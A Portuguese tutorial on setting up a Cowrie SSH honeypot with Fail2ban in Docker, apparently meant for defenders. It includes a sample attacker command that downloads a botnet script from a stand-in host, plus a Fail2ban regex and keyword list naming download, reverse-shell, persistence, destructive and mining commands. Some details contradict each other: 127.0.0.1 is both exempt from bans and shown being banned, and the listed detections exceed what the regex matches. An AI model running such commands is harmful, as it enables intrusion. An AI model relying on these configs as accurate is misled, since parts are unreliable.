# Guia Completo: Sistema Honeypot com Cowrie e Fail2ban

## 📋 Índice
1. [Visão Geral do Sistema](#-visão-geral-do-sistema)
2. [Arquitetura e Componentes](#️-arquitetura-e-componentes)
3. [Cowrie Honeypot](#-cowrie-honeypot)
4. [Fail2ban - Sistema de Proteção](#️-fail2ban---sistema-de-proteção)
5. [Docker e Orquestração](#-docker-e-orquestração)
6. [Fluxo de Funcionamento](#-fluxo-de-funcionamento)
7. [Configurações Detalhadas](#️-configurações-detalhadas)
8. [Comandos Úteis](#️-comandos-úteis)

---

## 🎯 Visão Geral do Sistema

Este sistema é uma **armadilha de segurança (honeypot)** que:
- **Simula um servidor SSH real** para atrair atacantes
- **Registra todas as atividades** dos invasores
- **Detecta comandos maliciosos** automaticamente
- **Bane IPs automaticamente** quando detecta comportamento suspeito

### Objetivos
- Coletar informações sobre técnicas de ataque
- Proteger a infraestrutura real
- Aprender sobre ameaças cibernéticas
- Detectar e bloquear atacantes automaticamente

---

## 🏗️ Arquitetura e Componentes

```
┌─────────────────────────────────────────────────────────┐
│                    INTERNET                              │
│                    (Atacantes)                           │
└────────────────────┬────────────────────────────────────┘
                     │
                     │ SSH (porta 22)
                     ▼
┌─────────────────────────────────────────────────────────┐
│                  VPS/SERVIDOR HOST                       │
│                                                           │
│  ┌─────────────────────────────────────────────────┐   │
│  │         Docker Network (honeynet)                 │   │
│  │  ┌───────────────────────────────────────────┐   │   │
│  │  │  Container: cowrie_honeypot              │   │   │
│  │  │  - Porta 22 → 2222 (mapeamento)          │   │   │
│  │  │  - Simula SSH server                     │   │   │
│  │  │  - Registra todos os comandos            │   │   │
│  │  │  - Gera logs JSON                        │   │   │
│  │  └───────────────────────────────────────────┘   │   │
│  └─────────────────────────────────────────────────┘   │
│                                                           │
│  ┌─────────────────────────────────────────────────┐   │
│  │  Container: fail2ban_monitor                     │   │
│  │  - Modo: host network                            │   │
│  │  - Lê logs do Cowrie                            │   │
│  │  - Detecta comandos maliciosos                  │   │
│  │  - Bane IPs via iptables                        │   │
│  └─────────────────────────────────────────────────┘   │
│                                                           │
│  ┌─────────────────────────────────────────────────┐   │
│  │  iptables (DOCKER-USER chain)                   │   │
│  │  - Bloqueia tráfego de IPs banidos              │   │
│  └─────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
```

---

## 🦠 Cowrie Honeypot

### O que é?
O **Cowrie** é um honeypot SSH/Telnet de médio interação que:
- Simula um servidor Linux real
- Permite que atacantes façam login e executem comandos
- **NÃO executa comandos reais** - apenas simula respostas
- Registra tudo em logs JSON estruturados

### Configuração no docker-compose.yml

```yaml
honeypot:
  image: cowrie/cowrie:latest
  container_name: cowrie_honeypot
  ports:
    - "22:2222"  # Porta 22 do host → porta 2222 do container
  volumes:
    - cowrie-logs:/cowrie/cowrie-git/var/log/cowrie
  networks:
    - honeynet
```

### Como Funciona

1. **Atacante conecta** na porta 22 do servidor
2. **Cowrie recebe** a conexão (mapeada para porta 2222 internamente)
3. **Simula autenticação SSH** - aceita qualquer login/senha
4. **Atacante executa comandos** - Cowrie simula execução
5. **Logs são gerados** em formato JSON no arquivo `cowrie.json`

### Exemplo de Log Gerado

```json
{
  "eventid": "cowrie.command.input",
  "input": "wget http://malicious.com/botnet.sh",
  "message": "CMD: wget http://malicious.com/botnet.sh",
  "src_ip": "127.0.0.1",
  "timestamp": "2025-11-16T21:07:26.395058Z",
  "sensor": "3a78002ba118",
  "uuid": "db5d015e-c2d0-11f0-adce-3e0817dacbfc"
}
```

### Campos Importantes
- `eventid`: Tipo de evento (command.input, login.success, etc.)
- `input`: Comando digitado pelo atacante
- `src_ip`: IP de origem do atacante
- `timestamp`: Data/hora do evento
- `message`: Mensagem descritiva do evento

---

## 🛡️ Fail2ban - Sistema de Proteção

### O que é?
O **Fail2ban** é um sistema de prevenção de intrusão que:
- Monitora logs em tempo real
- Detecta padrões suspeitos usando expressões regulares
- Bane IPs automaticamente quando detecta comportamento malicioso
- Usa iptables para bloquear o tráfego

### Configuração no docker-compose.yml

```yaml
fail2ban:
  image: crazymax/fail2ban:latest
  container_name: fail2ban_monitor
  network_mode: "host"  # Usa rede do host para ver IPs reais
  cap_add:
    - NET_ADMIN  # Permite modificar iptables
    - NET_RAW
  volumes:
    - ./fail2ban-data:/data  # Configurações
    - cowrie-logs:/var/log/cowrie:ro  # Logs do Cowrie (somente leitura)
```

### Componentes do Fail2ban

#### 1. **Jails** (`jail.d/malware-commands.local`)
Define **o que monitorar** e **quando banir**:

```ini
[malware-commands]
enabled = true
filter = malware-commands          # Qual filtro usar
logpath = /var/log/cowrie/cowrie.json  # Onde estão os logs
maxretry = 1                      # Banir após 1 comando malicioso
findtime = 10m                    # Janela de tempo para contar falhas
bantime = 24h                     # Tempo de banimento
action = docker-user              # Como banir (via iptables)
ignoreip = 127.0.0.1/8            # IPs a ignorar
```

**Parâmetros:**
- `maxretry`: Quantas detecções antes de banir
- `findtime`: Período para contar as detecções
- `bantime`: Duração do banimento
- `ignoreip`: IPs que nunca serão banidos

#### 2. **Filters** (`filter.d/malware-commands.conf`)
Define **o que procurar** nos logs usando expressões regulares:

```ini
[Definition]
failregex = ^.*"eventid":"cowrie\.command\.input".*"input":"[^"]*(wget|curl|nmap|chmod\s*\+x|\.\/|sh\s|/tmp/|authorized_keys|adduser|useradd|passwd.*root|nmap|xmrig|miner|;|&&|>|<|\|).*".*"src_ip":"<HOST>".*$
```

**Como funciona:**
- Procura por `eventid: "cowrie.command.input"` (comandos executados)
- Extrai o IP de `src_ip` (substitui `<HOST>` pelo IP real)
- Verifica se o `input` contém comandos maliciosos
- Se encontrar, conta como uma "falha"

**Comandos detectados:**
- **Downloads**: `wget`, `curl`, `tftp`, `ftp`
- **Execução**: `chmod +x`, `./`, `sh`, `python`, `perl`
- **Escalação**: `authorized_keys`, `adduser`, `useradd`, `passwd root`
- **Reconhecimento**: `nmap`, `uname -a`, `id`, `whoami`, `ps aux`
- **Destrutivos**: `rm -rf`, `killall`, `dd if=`
- **Reverse Shells**: `nc`, `netcat`, `bash -i`
- **Mineração**: `xmrig`, `miner`, `cryptominer`
- **Padrões suspeitos**: `;`, `&&`, `>`, `<`, `|`

#### 3. **Actions** (`action.d/docker-user.conf`)
Define **como banir** o IP:

```ini
[Definition]
actionban = iptables -I DOCKER-USER 1 -s <ip> -j DROP
actionunban = iptables -D DOCKER-USER -s <ip> -j DROP
```

**Como funciona:**
- `actionban`: Adiciona regra no iptables para bloquear o IP
- `actionunban`: Remove a regra quando o banimento expira
- Usa a cadeia `DOCKER-USER` (necessária para containers Docker)

---

## 🐳 Docker e Orquestração

### Por que Docker?

1. **Isolamento**: Honeypot isolado em container separado
2. **Facilidade**: Configuração via docker-compose
3. **Portabilidade**: Funciona em qualquer sistema com Docker
4. **Segurança**: Se comprometido, não afeta o host

### Estrutura do docker-compose.yml

```yaml
services:
  honeypot:          # Container do Cowrie
    # Rede isolada (honeynet)
    # Volume para logs
  
  fail2ban:          # Container do Fail2ban
    network_mode: "host"  # Precisa ver IPs reais
    # Acessa logs do Cowrie via volume compartilhado
    # Modifica iptables do host

volumes:
  cowrie-logs:       # Volume compartilhado para logs

networks:
  honeynet:          # Rede isolada para o honeypot
```

### Volumes

**cowrie-logs** (volume nomeado):
- Criado automaticamente pelo Docker
- Armazena logs do Cowrie
- Compartilhado entre containers (read-only no fail2ban)

**fail2ban-data** (bind mount):
- Diretório local: `./fail2ban-data`
- Montado em: `/data` no container
- Contém todas as configurações do fail2ban

### Rede

**honeynet** (bridge):
- Rede isolada para o honeypot
- Isola o honeypot do resto do sistema

**host** (fail2ban):
- Fail2ban usa rede do host
- Necessário para ver IPs reais dos atacantes
- Permite modificar iptables do host

---

## 🔄 Fluxo de Funcionamento

### 1. Atacante Conecta
```
Atacante (IP: 127.0.0.1)
    │
    │ SSH na porta 22
    ▼
Servidor Host
    │
    │ Mapeamento 22→2222
    ▼
Container Cowrie
    │
    │ Simula autenticação
    ▼
Atacante autenticado (qualquer login/senha funciona)
```

### 2. Atacante Executa Comando Malicioso
```
Atacante digita: wget http://malicious.com/botnet.sh
    │
    ▼
Cowrie simula execução (não executa de verdade)
    │
    ▼
Log gerado em cowrie.json:
{
  "eventid": "cowrie.command.input",
  "input": "wget http://malicious.com/botnet.sh",
  "src_ip": "127.0.0.1",
  ...
}
```

### 3. Fail2ban Detecta
```
Fail2ban monitora cowrie.json em tempo real
    │
    │ Lê nova linha do log
    ▼
Aplica regex do filtro malware-commands
    │
    │ Regex encontra: wget + IP 127.0.0.1
    ▼
Conta como 1 falha
    │
    │ maxretry = 1 (já atingiu o limite)
    ▼
Executa ação: docker-user
```

### 4. IP é Banido
```
Fail2ban executa: iptables -I DOCKER-USER 1 -s 127.0.0.1 -j DROP
    │
    ▼
Regra adicionada no iptables:
DROP all -- 127.0.0.1 anywhere
    │
    ▼
Próxima tentativa de conexão do IP é bloqueada
    │
    ▼
Atacante não consegue mais conectar
```

### 5. Banimento Expira (após 24h)
```
Após bantime (24h)
    │
    ▼
Fail2ban executa: iptables -D DOCKER-USER -s 127.0.0.1 -j DROP
    │
    ▼
Regra removida do iptables
    │
    ▼
IP pode conectar novamente (mas será banido novamente se tentar atacar)
```

---

## ⚙️ Configurações Detalhadas

### Arquivo: `fail2ban-data/jail.d/malware-commands.local`

```ini
[malware-commands]
enabled = true                    # Jail ativo
filter = malware-commands         # Usa filtro malware-commands
logpath = /var/log/cowrie/cowrie.json  # Monitora este arquivo
maxretry = 1                      # 1 comando malicioso = ban
findtime = 10m                    # Janela de 10 minutos
bantime = 24h                     # Bane por 24 horas
action = docker-user              # Usa ação docker-user
ignoreip = 127.0.0.1/8           # Nunca bane localhost
```

**Explicação dos parâmetros:**

- **maxretry = 1**: Após 1 comando malicioso detectado, bane imediatamente
- **findtime = 10m**: Se encontrar múltiplos comandos em 10 minutos, conta como falhas
- **bantime = 24h**: IP fica banido por 24 horas
- **ignoreip**: IPs nesta lista nunca serão banidos (útil para testes)

### Arquivo: `fail2ban-data/filter.d/malware-commands.conf`

```ini
[Definition]
failregex = ^.*"eventid":"cowrie\.command\.input".*"input":"[^"]*(wget|curl|...).*".*"src_ip":"<HOST>".*$
```

**Estrutura da regex:**
- `^.*` - Início da linha (qualquer coisa antes)
- `"eventid":"cowrie\.command\.input"` - Tipo de evento (comando)
- `.*` - Qualquer coisa no meio
- `"input":"[^"]*(wget|curl|...)"` - Campo input com comando malicioso
- `.*` - Qualquer coisa no meio
- `"src_ip":"<HOST>"` - IP do atacante (fail2ban substitui <HOST>)
- `.*$` - Fim da linha

**Por que essa ordem?**
No JSON do Cowrie, os campos aparecem nesta ordem:
1. `eventid`
2. `input`
3. `message`, `sensor`, `uuid`, `timestamp`
4. `src_ip` (no final)

---

## 🛠️ Comandos Úteis

### Gerenciamento do Fail2ban

```bash
# Ver status de todos os jails
docker exec fail2ban_monitor fail2ban-client status

# Ver status do jail malware-commands
docker exec fail2ban_monitor fail2ban-client status malware-commands

# Recarregar configuração
docker exec fail2ban_monitor fail2ban-client reload malware-commands

# Reiniciar fail2ban
docker restart fail2ban_monitor
```

### Gerenciamento de IPs Banidos

```bash
# Desbanir um IP específico
docker exec fail2ban_monitor fail2ban-client set malware-commands unbanip 127.0.0.1

# Desbanir todos os IPs
docker exec fail2ban_monitor fail2ban-client set malware-commands unbanall

# Ver IPs banidos
docker exec fail2ban_monitor fail2ban-client status malware-commands | grep "Banned IP"
```

### Verificação de iptables

```bash
# Ver todas as regras da cadeia DOCKER-USER
sudo iptables -L DOCKER-USER -n -v

# Ver apenas regras de DROP (IPs banidos)
sudo iptables -L DOCKER-USER -n -v | grep DROP

# Remover regra manualmente (se necessário)
sudo iptables -D DOCKER-USER -s 127.0.0.1 -j DROP
```

### Logs e Monitoramento

```bash
# Ver logs do Cowrie em tempo real
docker logs -f cowrie_honeypot

# Ver logs do Fail2ban
docker logs -f fail2ban_monitor

# Ver últimas linhas do log do Cowrie
docker exec cowrie_honeypot tail -50 /cowrie/cowrie-git/var/log/cowrie/cowrie.json

# Ver logs do Fail2ban com filtro
docker logs fail2ban_monitor | grep -i "ban\|unban"
```

### Gerenciamento de Containers

```bash
# Ver containers rodando
docker ps

# Parar todos os serviços
docker-compose down

# Iniciar serviços
docker-compose up -d

# Ver logs de todos os serviços
docker-compose logs -f
```

### Teste do Sistema

```bash
# 1. Conectar no honeypot (porta 22)
ssh root@SEU_SERVIDOR -p 22

# 2. Qualquer login/senha funciona (ex: root/teste)

# 3. Executar comando malicioso
wget http://google.com

# 4. Verificar se foi banido
docker exec fail2ban_monitor fail2ban-client status malware-commands

# 5. Tentar conectar novamente (deve falhar)
ssh root@SEU_SERVIDOR -p 22
```
